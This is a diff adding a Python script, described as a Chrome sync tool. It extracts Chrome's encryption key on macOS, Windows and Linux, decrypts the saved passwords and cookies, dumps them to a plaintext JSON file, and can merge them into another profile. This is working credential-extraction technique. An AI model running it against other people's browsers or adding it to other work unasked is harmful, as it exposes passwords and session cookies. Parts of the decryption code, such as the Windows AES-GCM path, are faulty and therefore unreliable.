@@ -1,0 +1,399 @@
+#!/usr/bin/env python
+
+"""
+    Get unencrypted 'Saved Password','Cookie' etc from Google Chrome,do sth such Bookmarks ,extensions etc as Google_sync
+    Supported platform: Mac, Linux and Windows
+    Now logins and cookies
+    
+"""
+import secretstorage
+import json
+import platform
+import sqlite3
+import string
+import subprocess
+import os
+import socket
+import base64
+import argparse
+import datetime
+from getpass import getuser
+from importlib import import_module
+from os import unlink
+from shutil import copy
+from Crypto.Protocol import KDF
+from Crypto.Cipher import AES
+from binascii import b2a_hex, a2b_hex
+
+
+
+__author__ = 'Jason Chen'
+__email__ = 'jason999988.chen@gmail.com'
+
+
+class ChromeMac:
+    """ Decryption class for chrome mac installation """
+    def __init__(self):
+        """ Mac Initialization Function """
+        my_pass = subprocess.Popen(
+            "security find-generic-password -wa 'Chrome'",
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            shell=True)
+
+        stdout, _ = my_pass.communicate()
+        my_pass = stdout.replace(b'\n', b'')
+
+        iterations = 1003
+        salt = b'saltysalt'
+        length = 16
+
+        self.key = KDF.PBKDF2(my_pass, salt, length, iterations)
+        self.dbpath = (f"/Users/{getuser()}/Library/Application Support/"
+                       "Google/Chrome/Default/")
+        self.working_dir = os.path.realpath('.') + '/'
+
+    def decrypt_func(self, enc_passwd):
+        """ Mac Decryption Function """
+        initialization_vector = b' ' * 16
+        enc_passwd = enc_passwd[3:]
+        cipher = AES.new(self.key, AES.MODE_CBC, IV=initialization_vector)
+        decrypted = cipher.decrypt(enc_passwd)
+        return decrypted.strip().decode('utf8')
+    
+    def encrypt_func(self, plaintext):
+        """Mac Encryption Function """
+        pass
+
+
+class ChromeWin:
+    """ Decryption class for chrome windows installation """
+    
+    def __init__(self):
+        """ Windows Initialization Function """
+        # search the genral chrome version path 
+        win_path = os.environ['USERPROFILE'] + os.sep + "AppData\\Local\\Google\\Chrome\\User Data\\"
+        with open(win_path + r'Local State', "r", encoding='utf-8') as f:
+            local_state = json.loads(f.read())
+        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]
+        win32crypt = import_module("win32crypt")
+        self.key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+        self.dbpath =win_path + '\\Default\\' 
+        self.working_dir = os.path.realpath('.') + '\\'
+       
+    def decrypt_func(self, enc_passwd):
+        """ Windows Decryption Function """
+        try:
+            win32crypt = import_module('win32crypt')
+            data = win32crypt.CryptUnprotectData(enc_passwd, None, None, None, 0)[1]
+            if isinstance(data, bytes):
+                data = str(data, 'utf-8')
+            return data
+        except Exception as ex:
+            
+            enc_passwd = enc_passwd[3:]
+            initialization_vector = b' ' * 16
+            cipher = AES.new(self.key, AES.MODE_GCM, IV=initialization_vector)
+            decrypted = cipher.decrypt(enc_passwd)
+            return decrypted.strip().decode('utf8')
+
+    def encrypt_func(self,plaintext):
+        """ Windows Encryption Function """
+        pass
+
+
+class ChromeLinux:
+    """ Decryption class for chrome linux installation """
+    def __init__(self):
+        """ Linux Initialization Function """
+        my_pass = 'peanuts'.encode('utf8')
+        bus = secretstorage.dbus_init()
+        collection = secretstorage.get_default_collection(bus)
+        for item in collection.get_all_items():
+            if item.get_label() == 'Chrome Safe Storage':
+                my_pass = item.get_secret()
+                break
+        iterations = 1
+        salt = b'saltysalt'
+        length = 16
+
+        self.key = KDF.PBKDF2(my_pass, salt, length, iterations)
+        self.dbpath = f"/home/{getuser()}/.config/google-chrome/Default/"
+        self.working_dir = os.path.realpath('.') + '/'
+
+    def decrypt_func(self, enc_passwd):
+        """ Linux Decryption Function """
+        initialization_vector = b' ' * 16
+        enc_passwd = enc_passwd[3:]
+        cipher = AES.new(self.key, AES.MODE_CBC, IV=initialization_vector)
+        decrypted = cipher.decrypt(enc_passwd)
+        return decrypted.strip().decode('utf8')
+    
+    def encrypt_func(self,plaintext):
+        """ Linux Encryption Function """
+        initialization_vector = b' ' * 16
+        cipher = AES.new(self.key, AES.MODE_CBC, IV=initialization_vector)
+        mode_val = 16-len(plaintext)%16
+        plaintext = plaintext + mode_val*chr(mode_val)
+        encrypted = cipher.encrypt(plaintext)
+        return encrypted
+
+
+class Chrome:
+    """ Generic OS independent Chrome class """
+    def __init__(self):
+        """ determine which platform you are on """
+        target_os = platform.system()
+        if target_os == 'Darwin':
+            self.chrome_os = ChromeMac()
+        elif target_os == 'Windows':
+            self.chrome_os = ChromeWin()
+        elif target_os == 'Linux':
+            self.chrome_os = ChromeLinux()
+        self.backup_dir = self.chrome_os.working_dir + 'backup' +os.sep
+        self.working_dir = self.chrome_os.working_dir + 'work' + os.sep
+        self.login_col = []
+        self.cookies_col = []
+
+    @property
+    def get_login_db(self):
+        """ getting "Login Data" sqlite database path """
+        return self.chrome_os.dbpath
+
+    def get_table_col(self,cursor,tbl):
+        cursor.execute(f"PRAGMA table_info({tbl})") 
+        return [result[1] for result in cursor.fetchall()]
+    
+    def decrypt_func(self,content):
+        """
+            if wrong just return origin value,always content is BLOB
+        """
+        try:
+            decrypt = self.chrome_os.decrypt_func(content)
+            return decrypt
+        except Exception as ex:
+            return content.decode('utf8','replace')
+
+    def encrypt_func(self,plaintext):
+        """
+            if wrong just return origin value
+        """
+        try:
+            encrypt = self.chrome_os.encrypt_func(plaintext)
+            return encrypt
+        except Exception as ex:
+            return plaintext.encode('utf8','replace')
+
+    def get_password(self):
+        """ get URL, username and password in clear text
+            :return: clear text data in dictionary format
+        """
+        copy(self.chrome_os.dbpath + "Login Data", "Login Data.db")
+        conn = sqlite3.connect("Login Data.db")
+        cursor = conn.cursor()
+        col = self.get_table_col(cursor,'logins')
+        cursor.execute("""
+            SELECT *
+            FROM logins; """)
+        data = []
+        for result in cursor.fetchall():         
+            _data = {}
+            for i in range(len(result)):
+                if col[i] in ['form_data','moving_blocked_for','possible_username_pairs']:
+                    try:
+                        _data[f'{col[i]}'] = result[i].decode('utf8','replace') if not isinstance(result[i],str)  else result[i]
+                    except Exception as ex:
+                        print(ex)
+                else:    
+                    _data[f'{col[i]}'] = result[i] if col[i] != 'password_value' else ''.join(i for i in self.decrypt_func(result[i]) if i in string.printable)
+            
+            data.append(_data)
+        conn.close()
+        self.login_col = col
+        unlink("Login Data.db")
+        return data
+    
+    def get_cookies(self):
+        copy(self.chrome_os.dbpath + "Cookies", "Cookies.db")
+        conn = sqlite3.connect("Cookies.db")
+        cursor = conn.cursor()
+        col = self.get_table_col(cursor,'cookies')
+        cursor.execute("""
+            SELECT *
+            FROM cookies; """)
+        data = []
+        for result in cursor.fetchall():
+            _data = {}
+            for i in range(len(result)):
+                _data[f'{col[i]}'] = result[i] if col[i] != 'encrypted_value' else self.decrypt_func(result[i])
+            data.append(_data)
+        conn.close()
+        self.cookies_col = col
+        unlink("Cookies.db")
+        return data
+    
+    def get_bookmarks(self):
+        with open(self.chrome_os.dbpath + 'Bookmarks') as bookmarks:
+            data = json.load(bookmarks)
+        return data
+    
+
+    def sync_login(self,data_in,data_out):
+        """ 
+            origin_url,username_element,username_value,password_element,signon_realm
+        """
+        conn = sqlite3.connect(self.working_dir + "Login Data",timeout=100)
+        self.login_col.remove('id')
+        for comp_rec in data_in:
+            flag = 0
+            for rec in data_out:
+                if comp_rec['origin_url'] == rec['origin_url'] and comp_rec['username_element'] ==rec['username_element'] and comp_rec['password_element'] == rec['password_element'] \
+                and comp_rec['signon_realm'] == rec['signon_realm'] and comp_rec['username_value'] == rec['username_value']:
+                    flag = 1
+                    break
+            if flag == 0:
+                #yield(self.sys_in(comp_rec,conn))
+                self.syc_in(comp_rec,conn)
+        conn.commit()
+        conn.close
+        return True
+    
+    def syc_in(self,data,conn,typ='login'):
+        if typ =='login':
+            data['password_value'] =b'v11' + self.chrome_os.encrypt_func(data['password_value'])
+            #print('\n '  + data['password_value'])
+            data['form_data'] = data['form_data'].encode('utf8','replace')
+            data['possible_username_pairs'] = data['possible_username_pairs'].encode('utf8')
+            tblcol = self.login_col
+            tbl = 'logins'
+            sqlappend = [data[k] if k not in ['form_data','possible_username_pairs'] else sqlite3.Binary(data[k]) for k in tblcol]
+        else :
+            data['encrypted_value'] = self.chrome_os.encrypt_func(data['encrypted_value'])
+            tblcol = self.cookies_col
+            tbl = 'cookies'
+            sqlappend = [data[k] if k != 'encrypted_value' else sqlite3.Binary(data[k]) for k in tblcol]
+        
+        sql = f'insert into {tbl} (' +  ','.join(tblcol)  +') values(' +','.join(['?' for i in tblcol]) + ')'
+        conn.execute(sql,sqlappend)
+        #conn.commit()
+
+    def sync_cookies(self,data_in,data_out):
+        """
+            host_key,name,path
+        """
+        conn = sqlite3.connect(self.working_dir + "Cookies",timeout=100)
+        
+        for comp_rec in data_in:
+            flag = 0
+            for rec in data_out:
+                if comp_rec['host_key'] == rec['host_key'] and comp_rec['name'] ==rec['name'] and comp_rec['path'] == rec['path'] :
+                    flag = 1
+                    break
+            if flag == 0:
+                self.syc_in(comp_rec,conn,typ='cookies')
+                
+        conn.close()
+        return True
+
+    def sync_bookmarks(self,data_in,data_out):
+        """
+          element: ...{children:[ ... name,type(url),url...]  name,type(folder)} ...
+        """
+        pass 
+
+    def chrome_sync(self,resource_in,resource_out):
+        self.backup()
+        master_key_in = list(resource_in.keys())[0]
+        master_key_out = list(resource_out.keys()) [0]
+        if self.sync_login(resource_in[master_key_in]['login'],resource_out[master_key_out]['login']):
+            copy(self.working_dir + 'Login Data',self.chrome_os.dbpath)
+            if self.sync_cookies(resource_in[master_key_in]['cookies'],resource_out[master_key_out]['cookies']):
+                copy(self.working_dir + 'Cookies',self.chrome_os.dbpath)
+                self.sync_bookmarks(resource_in[master_key_in]['bookmarks'],resource_out[master_key_out]['bookmarks'])
+                #copy(self.working_dir + 'Bookmarks',self.chrome_os.dbpath)
+        return
+    
+    def backup(self):
+        if os.path.exists(self.backup_dir) == False:
+            try:
+                os.mkdir(self.backup_dir)
+            except:
+                return False
+        if os.path.exists(self.working_dir) == False:
+            try:
+                os.mkdir(self.working_dir)
+            except:
+                return False
+        copy(self.chrome_os.dbpath + 'Cookies',self.working_dir )
+        copy(self.chrome_os.dbpath + 'Login Data',self.working_dir)
+        copy(self.chrome_os.dbpath + 'Bookmarks',self.working_dir)
+
+        if os.path.exists(self.backup_dir  + 'Cookies')==False :               
+            copy(self.chrome_os.dbpath + 'Cookies',self.backup_dir )
+        if not os.path.exists(self.backup_dir + 'Login Data') :                           
+            copy(self.chrome_os.dbpath + 'Login Data',self.backup_dir)
+        if not os.path.exists(self.backup_dir + 'Bookmarks') :            
+            copy(self.chrome_os.dbpath + 'Bookmarks',self.backup_dir)
+        return True
+
+    def restore(self):
+        if os.path.exists(self.backup_dir) == False:
+            return False
+        copy(self.backup_dir + 'Cookies',self.chrome_os.dbpath  )
+        copy(self.backup_dir + 'Login Data',self.chrome_os.dbpath)
+        copy(self.backup_dir + 'Bookmarks',self.chrome_os.dbpath)
+        return True
+
+def run():
+
+    hostname  = socket.gethostname()
+    appendfilename = datetime.datetime.now().strftime('%Y%m%d')
+    
+    parser = argparse.ArgumentParser(description="Sync Chrome Client wihtout Googl-Chrom-Sync")
+    parser.add_argument('-v','--verbose',help='output verbosity',action='store_true')
+    parser.add_argument('-s','--sync',help="Sync  Chrome  Function",action='store_true')
+    parser.add_argument('-i','--input',help="Other  chrome resources json file name")
+    parser.add_argument('-o','--output',help="Local chrome resources json file name,without any option,default filename is " + f'{hostname}-{appendfilename}.json',
+                        default=f'{hostname}-{appendfilename}.json' )
+    parser.add_argument('-r','--restore',help='Restore local chrome resources to normal env',action='store_true')
+    parser.add_argument('-b','--backup',help='Backup local chrome resources',action='store_true')
+    args = parser.parse_args()
+
+    chrome = Chrome()
+    if args.restore:
+        if not chrome.restore():
+            print('Restore Error')
+            return
+    elif args.backup:
+      if not chrome.backup():
+            print('Backup Error')
+            return
+    elif args.sync:
+        _key = f'{hostname}--Chrome'
+        data={_key:{}}
+        data[_key]['login'] = chrome.get_password()
+        data[_key]['cookies'] = chrome.get_cookies()
+        data[_key]['bookmarks'] = chrome.get_bookmarks()
+        if args.output:
+            with open(chrome.chrome_os.working_dir + args.output,'wt',encoding='utf8') as outf:
+                json.dump(data,outf,ensure_ascii=False)
+        if args.input:
+            try:
+                infile = chrome.chrome_os.working_dir + args.input
+                f = open(infile,encoding='utf8')
+                otherdata = json.load(f)
+                chrome.chrome_sync(otherdata,data)
+            except Exception as ex:
+                print(ex)
+                return
+
+        if args.verbose :
+            print(json.dumps(data, indent=4))
+    else:
+        parser.print_help()
+        return
+
+
+if __name__ == '__main__':
+    run()
